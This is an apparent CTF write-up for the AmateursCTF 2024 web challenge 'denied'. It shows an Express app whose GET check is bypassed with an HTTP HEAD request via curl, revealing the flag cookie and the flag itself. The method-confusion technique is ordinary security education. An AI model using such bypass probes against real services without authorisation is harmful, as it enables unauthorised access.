---
title: "denied"
description: "what options do i have?"
pubDate: 2024-04-10
ctf: "AmateursCTF 2024"
category: "web"
author: "sealldev"
section: "CTFs"
image: "images/24-amateursctf/icon.png"
---

The file we are given is `index.js`:
```js
const express = require('express')
const app = express()
const port = 3000

app.get('/', (req, res) => {
  if (req.method == "GET") return res.send("Bad!");
  res.cookie('flag', process.env.FLAG ?? "flag{fake_flag}")
  res.send('Winner!')
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

I start with a `POST` which doesn't help.

```
$ curl -X POST "http://denied.amt.rs"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /</pre>
</body>
</html>
```

Alright, let's see what `OPTIONS` we have:
```
$ curl -X OPTIONS "http://denied.amt.rs"
GET,HEAD
```

Let's try `HEAD`:
```
$ curl -I "http://denied.amt.rs"
HTTP/1.1 200 OK
Content-Length: 7
Content-Type: text/html; charset=utf-8
Date: Mon, 08 Apr 2024 19:19:07 GMT
Etag: W/"7-skdQAtrqJAsgWjDuibJaiRXqV44"
Server: Caddy
Set-Cookie: flag=amateursCTF%7Bs0_m%40ny_0ptions...%7D; Path=/
X-Powered-By: Express
```

The cookie is the key!

Flag: `amateursCTF{s0_m@ny_0ptions...}`